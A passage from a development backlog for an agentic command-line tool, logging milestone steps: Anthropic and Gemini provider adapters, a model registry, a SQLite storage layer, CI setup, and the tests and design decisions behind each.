- The trade-off: callers wanting compile-time typed options should import the adapter's `create<X>Provider` directly. Going through `entry.factory` is type-erased on options. Documented in the `ModelEntry.factory` comment.

**Tests added:**
- `tests/providers/google-stream.test.ts` — **12 tests** covering text-only, functionCall lifecycle, synthesized vs SDK-provided ids, thought parts, finishReason mapping (8 cases incl. unknown), null doesn't clobber, empty stream, mixed-parts.
- `tests/providers/google.test.ts` — **12 tests** covering model rejection, env var lookup (GOOGLE_API_KEY / GEMINI_API_KEY), capabilities, generateConstrained stub, generate end-to-end through mock client, role/content mapping (`assistant`→`model`), config forwarding, `tool_result` block throw, countTokens (with totalTokens fallback to 0).
- `tests/providers/registry.test.ts` updated to assert both Anthropic and Google lineups, parity per family, and "all default entries can be instantiated with just an apiKey" — the regression test for "easy to add new providers".
- Total suite now **110 tests / 224 expect() calls** in ~500ms.

**Decisions:**
- **`(opts?: unknown) => Provider`** at the registry boundary — chosen over a discriminated union or a generic `ModelEntry<TOpts>` because both alternatives forced every consumer of the registry to either narrow on family or carry generics that erase at lookup time. The `unknown`-with-cast pattern keeps adding a family to a 1-line change in `createDefaultRegistry`. Compile-time safety on options is recovered by importing the family's `create<X>Provider` directly.
- **API key precedence for Google**: `opts.apiKey` → `GOOGLE_API_KEY` → `GEMINI_API_KEY`. Both env vars are common in the wild; we accept either to reduce friction.
- **Gemini `tool_result` blocks throw rather than silently corrupt**. Gemini correlates function calls by name, not id; doing the conversion correctly requires the original function name, which only the harness knows. Throwing is honest until Step 5 wires the resolution.
- **Function call ids are synthesized** for Gemini when the SDK doesn't provide one (`call_<n>_<uuid>`). The same id is used across `tool_use_start` / `_delta` / `_stop` (asserted by test).
- **`thought: true` parts → `thinking_delta`** to mirror Anthropic's extended thinking pass-through. Plain text parts (`thought` absent or false) → `text_delta`.
- **Per-family register* helpers** instead of a generic `buildFamilyEntries(family, ...)` — the per-family helper lives in the family's folder, so adding a family doesn't touch shared `registry.ts` code at all (only the orchestration line).

**Out of scope:**
- Real network coverage (deferred to evals)
- `tool_result` round-trip in messages (Step 5 — harness needs id↔name map)
- OpenAI / Ollama / llama.cpp — adapters land in M5 with the same pattern

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`).

---

## [2026-04-27] M1 / Step 3 — Provider Anthropic adapter + Model Registry

**Done:**
- `src/providers/types.ts` — canonical `Provider`, `ProviderCapabilities`, `StreamEvent`, `ProviderMessage`, `GenerateRequest`, `ConstrainedRequest`, `ProviderToolDef`, `StopReason`, family/cache/tools/constrained enums (per `AGENTIC_CLI §14`, `PROVIDERS.md §1`, `CONTRACTS.md §4`).
- `src/providers/anthropic/capabilities.ts` — caps for the three M1 Anthropic models (opus-4-7, sonnet-4-6, haiku-4-5). Costs taken verbatim from `PROVIDERS.md §5`.
- `src/providers/anthropic/stream.ts` — `normalizeAnthropicStream(rawEvents)` converts SDK raw events into the canonical `StreamEvent` taxonomy. Handles parallel tool_use blocks, partial JSON arg accumulation, malformed JSON fallback, thinking deltas, signature-delta drop, unknown stop_reason fallback.
- `src/providers/anthropic/index.ts` — `createAnthropicProvider(modelName, opts)` factory. Reads API key from `opts.apiKey` or `ANTHROPIC_API_KEY`. Exposes a test-seam (`opts.client`) for injecting a pre-built SDK client. `generate()` streams; `countTokens()` calls the SDK; `generateConstrained()` is a deliberate stub that rejects with a clear "not implemented in M1" error.
- `src/providers/registry.ts` — `createRegistry()` factory + `createDefaultRegistry()` pre-populated with the three Anthropic models. Each entry carries id, family, modelName, capabilities, and a `factory(opts)` to instantiate a live `Provider`.
- `src/providers/index.ts` — public surface; re-exports types and constructors.
- `tests/providers/*.test.ts` — 3 files, **31 tests** covering: stream normalization (12 cases incl. text-only, tool_use lifecycle, malformed JSON, non-object args, parallel tool_use, signature_delta drop, default-when-no-stop, null doesn't clobber a prior valid stop_reason, omitted-stop-reason ignored), adapter shape + wiring (model rejection, env vs option key, id/family/capabilities, generateConstrained stub, generate end-to-end through mock client, optional-field omission, countTokens), registry (insert/get/has/list, duplicate refusal, default lineup, factory↔entry capability parity).
- Total suite now **86 tests / 166 expect() calls** in ~180ms.

**Code-review fixes folded in before commit:**
- `mapStopReason` no longer accepts null/undefined. The `message_delta` handler only updates `stopReason` when the SDK actually sends a string. A later `delta: { stop_reason: null }` can no longer clobber an earlier valid `'tool_use'` and turn the canonical `stop` event into the wrong reason.
- `KNOWN_STOP_REASONS` is typed as `ReadonlySet<string>`; the ugly `as Set<string>` cast is gone.
- Combined the duplicate `import` from `./anthropic/capabilities.ts` in the registry.
- Adapter wiring now has real coverage: a mock `Anthropic` client (passed via the `client` test seam) verifies that `generate()` pipes the SDK stream through the normalizer, that optional fields are omitted when absent, and that `countTokens()` calls `messages.countTokens` and returns the SDK's `input_tokens`.

**Decisions:**
- **No real API calls in unit tests.** The stream normalizer takes any `AsyncIterable<RawAnthropicEvent>`; tests construct mock event sequences with async generators. Real-network coverage will live in evals (M5+).
- **`RawAnthropicEvent` is a local minimal type**, structurally compatible with the SDK's `Anthropic.Messages.RawMessageStreamEvent`. Decouples the normalizer from SDK upgrades that touch peripheral fields.
- **`generateConstrained` is a stub.** Anthropic implements constrained output via forced `tool_choice`, but the M1 autonomous loop never calls it — the DAG executor (M6) does. Failing loud beats silent emulation.
- **`metadata` field on `GenerateRequest` is not forwarded** to the SDK (yet). Anthropic's `MetadataParam` is `{ user_id?: string | null }`, narrower than our generic `Record<string, string>`. Telemetry will route user identity through a dedicated channel when needed.
- **`ProviderToolDef.input_schema` is typed as `{ type: 'object'; ... }`**, not arbitrary `Record<string, unknown>`. Matches both Anthropic and OpenAI tool-calling requirements; refusing malformed schemas at compile time beats runtime errors from the provider.
- **Registry as factory, not singleton** — each test gets a fresh registry. Shared global state was the mistake to avoid.
- **`sampling: SamplingSupport`** field from `PROVIDERS.md §1` intentionally omitted in M1; arrives with `TOKEN_TUNING` work.
- **Capabilities are declared honestly** per `PROVIDERS.md` principle 2 — the adapter exposes streaming because it streams; tools because it does native tool-calling; cache because Anthropic's prompt cache is server-side. Nothing claimed that the code doesn't do.

**Out of scope:**
- Vision input (M2+ when CLI accepts image paste)
- Extended thinking *actions* (we pass `thinking_delta` through but don't yet leverage it for the agent loop)
- Cache breakpoints (responsibility of the Context Engine, not the adapter)
- Retry/backoff on 5xx/529 (lives in the harness's provider call wrapper, Step 5)
- Token-counter caching (every `countTokens` call hits the network; harness can memoize)
- OpenAI, Ollama, llama.cpp adapters (M5; this step lays the interface they'll implement)

**Follow-ups (registered now, addressed later):**
- `ModelEntry.factory` is monomorphic over `CreateProviderOptions` (currently aliased to `CreateAnthropicProviderOptions`). Once a second family lands, this needs to become a discriminated union (or the entry generic over its options type) so that calling an OpenAI factory with Anthropic options is a compile error, not a runtime crash. Address in M5 when the second adapter ships.
- `ProviderMessageRole` is `'user' | 'assistant'` (Anthropic represents tool results as user messages with `tool_result` blocks), but storage's `MessageRole` is `'user' | 'assistant' | 'tool'`. A storage→provider converter is needed when the harness joins both ends. Will land in Step 5.
- `ANTHROPIC_MODEL_NAMES = Object.keys(ANTHROPIC_CAPS)` loses literal types; if we want a typed union of allowed model names, we need `as const` plumbing or a generated constant. Cosmetic — fix when DX pain shows up.

**Pending:** none for this step.

**Next:** Step 4 — Permission Engine + first 6 tools (`AGENTIC_CLI §7.1, §8`). Glob/prefix policy YAML loader (no regex), `Tool<I, O>` interface, the read/write/edit/grep/glob/bash tools, harness-blocking pre-tool checks. The Anthropic adapter emits `tool_use_*` events; the tool layer will consume them.

---

## [2026-04-27] M1 / Step 2 — Storage layer (SQLite, MVP)

**Done:**
- `src/storage/db.ts` — connection factory over `bun:sqlite`. Sets `PRAGMA foreign_keys = ON` on every connection (Bun default is OFF). For file-backed DBs adds `journal_mode = WAL` and `synchronous = NORMAL`; skipped for `:memory:`. Auto-creates the parent directory.
- `src/storage/paths.ts` — XDG-aware default path resolution: `$XDG_DATA_HOME/forja/sessions.db` or `~/.local/share/forja/sessions.db`.
- `src/storage/migrate.ts` — idempotent runner. Records each applied migration in `_migrations` with `sha256(sql)`. Re-applying a migration whose SQL changed throws (catches accidental drift). Each migration runs inside a transaction.
- `src/storage/migrations/001-initial.ts` — first migration: `sessions`, `messages`, `tool_calls` per `AGENTIC_CLI §13`, with `CHECK` constraints on enum columns, FK cascades, and the indexes from §13. Inlined as TS so it survives `bun build --compile`.
- `src/storage/repos/{sessions,messages,tool-calls}.ts` — thin function-based repositories. No classes, no ORM. Camel-case domain types, snake-case row types, explicit `fromRow`. JSON columns serialized via `JSON.stringify`/`JSON.parse` (SQLite has no JSONB). State transitions enforced at the SQL layer (`UPDATE ... WHERE status = 'running'`) and reflected as thrown errors when the transition is illegal.
- `src/storage/index.ts` — single public surface; re-exports types and functions.
- `tests/storage/*.test.ts` — 6 files, **51 tests** covering: XDG fallback (incl. empty string), migration idempotency, hash-mismatch refusal, whitespace-insensitive hash, table creation, CRUD round-trips, ordering, filters, FK cascades, FK enforcement, CHECK rejection of invalid enums, illegal state transitions, cross-session parent rejection, transaction commit/rollback semantics, `openDb` directory creation, PRAGMA assertions.
- Total suite now **55 tests / 97 expect() calls** in ~150ms.

**Code-review fixes folded in before commit:**
- `finishToolCall` now refuses to overwrite a finished call (`AND status IN ('pending','running')` in the UPDATE). Without this, a buggy retry path could silently turn a `done` row into `error`.
- Migration hash now normalizes whitespace before SHA-256, so reformatting committed SQL no longer trips the drift detector. Semantic changes (renamed column, different type) still produce a different hash.
- Hash-mismatch error includes both the applied hash and the current hash.
- `appendMessage` validates that `parentId` lives in the same session (FK alone only checks existence). Prevents silently-corrupted message threads.
- `tool_calls` got a `created_at INTEGER NOT NULL` column and `idx_tool_calls_message_created`; `listToolCallsByMessage` now orders by `created_at ASC, id ASC` (UUIDs aren't time-sortable).
- `withTransaction(db, fn)` exposed in `src/storage/db.ts` so the harness can group multi-row writes (message + tool_calls) atomically without learning Bun's curried `db.transaction()` API.

**Decisions:**
- **`allowImportingTsExtensions: true`** added to tsconfig — Bun's idiomatic style is `.ts` in imports; without the flag tsc rejects them. Compatible because `noEmit: true`.
- **Disabled Biome rule `performance/noDelete`** — its auto-fix would convert `delete process.env.X` to `process.env.X = undefined`, which in Node/Bun sets the env var to the string literal `"undefined"` instead of removing it. That would silently break our XDG fallback test. The V8 hidden-class concern doesn't apply to non-hot test code.
- **Repos as functions, not classes** — keeps testing trivial (`(db, input) → result`), aligns with "no ORM" rule, matches the spec's pseudocode style.
- **JSON columns are `unknown`** at the type boundary — repos don't claim to know the shape of message content or tool input/output. Caller validates if it cares.
- **`completeSession` and `startToolCall` distinguish "not found" from "wrong state"** — diagnostic value at low cost.
- **Indexes from spec §13.1** included verbatim (`sessions(started_at DESC)`, `(cwd, started_at DESC)`, `(status, started_at DESC)`, `messages(session_id, created_at)`, `tool_calls(tool_name, status)`).

**Out of scope (deferred to the step that needs them):**
- `goal_stack` (with the harness when goal injection lands)
- `approvals` (with permissions)
- `checkpoints` (with rollback / git integration in M3)
- `hook_runs`, `background_processes`, `memory_events`, `recap_runs`, `recap_cache`, `traces`, `artifacts` (each with its own subsystem in M3+)

**Pending:** none for this step.

**Next:** Step 3 — Provider Anthropic adapter + Model Registry skeleton (`AGENTIC_CLI §14`, `PROVIDERS.md`). Minimal `Provider` interface, real `generate()` against `@anthropic-ai/sdk` with streaming, capability declaration, request shape that the harness will consume in Step 5.

---

## [2026-04-27] M1 / Step 1.5 — Production hygiene pass

**Done:**
- `.github/workflows/ci.yml` — runs typecheck → lint → test on push to `main` and on every PR. Bun pinned to `1.3.13`. Concurrency group cancels superseded runs.
- `.editorconfig` at the root — keeps cross-editor formatting aligned with Biome (2-space, LF, UTF-8, final newline). Markdown keeps trailing whitespace (line breaks).
- Trusted Biome's postinstall (`bun pm trust @biomejs/biome`) so the platform binary is fetched at install time instead of lazily on first lint. Bun added `trustedDependencies` to `package.json`.
- `tests/cli.test.ts` — first smoke test: `--version`, `-v`, `--version --json`, no-args exit-1. Also unblocks `bun test` in CI (zero test files makes Bun exit 1).

**Decisions:**
- **Skipped pre-commit hook and README.md** for now (explicit user call). CI gate covers the regression case for the moment.
- **CI uses `bun install --frozen-lockfile`** — fail loud if `bun.lock` drifts from `package.json`.
- **CI Bun version pinned to current dev (`1.3.13`)** rather than floating `latest` — reproducible builds beat free upgrades.
- **Smoke test uses `Bun.spawnSync`** (not `node:child_process`) — consistent with the runtime, no extra type dance.

**Pending:** README and pre-commit hook still owed eventually.

**Next:** Step 2 — Storage layer (SQLite) per `AGENTIC_CLI §13`.

---

## [2026-04-27] M1 / Step 1 — Repository bootstrap

**Done:**
- Branch `feat/m1-foundation` created from `main`.
- `CLAUDE.md` at the root: root premise, Doc→Subsystem map, locked stack, hard rules, workflow.
- `docs/BACKLOG.md` (this file).
- `package.json` with scripts (`dev`, `test`, `lint`, `typecheck`, `build`) and bin `agent`.
- `tsconfig.json` strict (including `noUncheckedIndexedAccess`, `exactOptionalPropertyTypes`, `verbatimModuleSyntax`).
- `biome.json` (linter + formatter, 100 col, single quotes, semicolons).
- `.gitignore` covering runtime state per spec §2.7 (`.agent/sessions.db`, traces, checkpoints, local memory).
- `src/cli/index.ts` stub — responds to `--version` / `-v`; anything else exits 1 with a pointer to the spec.
- Project-wide language policy: English everywhere except `docs/spec/` (PT-BR).

**Decisions:**
- **Test runner:** `bun test` built-in, not Vitest from spec §16. Reason: aligns with principle 5 ("single runtime"); zero extra deps. Revisit if a critical Vitest feature is missing.
- **Linter:** Biome (single binary, Bun-friendly) instead of ESLint + Prettier — same single-runtime alignment.
- **`docs/BACKLOG.md` instead of `.txt`** — markdown renders on GitHub and matches the rest of the repo.
- **Branch per milestone** (`feat/mN-*`) until trunk-based stabilizes.
- **No empty subsystem folders** — they emerge in the step that needs them. `.gitkeep` in empty dirs is noise.
- **Stack matches spec §3** exactly: TS + Bun + bun:sqlite + Ink. No drift.
- **Project language is English**; only `docs/spec/` stays in PT-BR.

**Pending:** none for this step.

**Next:** Step 2 — Storage layer (SQLite) with the minimal schema from `AGENTIC_CLI §13`: tables `sessions`, `messages`, `tool_calls`, `approvals`, `checkpoints`, `traces`. Migrations infra. Thin repository pattern over `bun:sqlite`. Schema + basic CRUD tests.
